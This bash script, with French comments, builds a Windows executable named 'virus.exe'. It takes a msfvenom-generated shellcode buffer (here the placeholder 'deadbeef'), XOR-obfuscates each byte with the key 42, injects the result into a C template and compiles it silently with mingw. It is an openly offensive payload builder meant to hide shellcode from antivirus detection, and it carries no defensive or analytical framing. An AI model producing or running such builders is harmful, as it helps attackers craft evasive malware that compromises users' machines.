#!/bin/bash

# Buffer généré par msfvenom (mais sans les \x)
original_buffer='deadbeef'
buffer_len=$((${#original_buffer}/2))

# Obfusque le buffer
buffer=""
for ((i = 0; i < buffer_len; i++)); do
  char_code=$((16#${original_buffer:$(($i*2)):2}))
  obfuscated_byte=$((char_code ^ 42))
  buffer+="\\x$(printf "%02x" "$obfuscated_byte")"
done

# Génère le code C à partir de base.c en remplaçant <BUF> et <BUFLEN>
base_content=$(<base.c)
replaced_content="${base_content//<BUF>/$buffer}"
replaced_content="${replaced_content//<BUFLEN>/$buffer_len}"
echo "$replaced_content" > virus.c

# Compilation du code généré en .exe
x86_64-w64-mingw32-gcc -mwindows -Wall virus.c -o virus.exe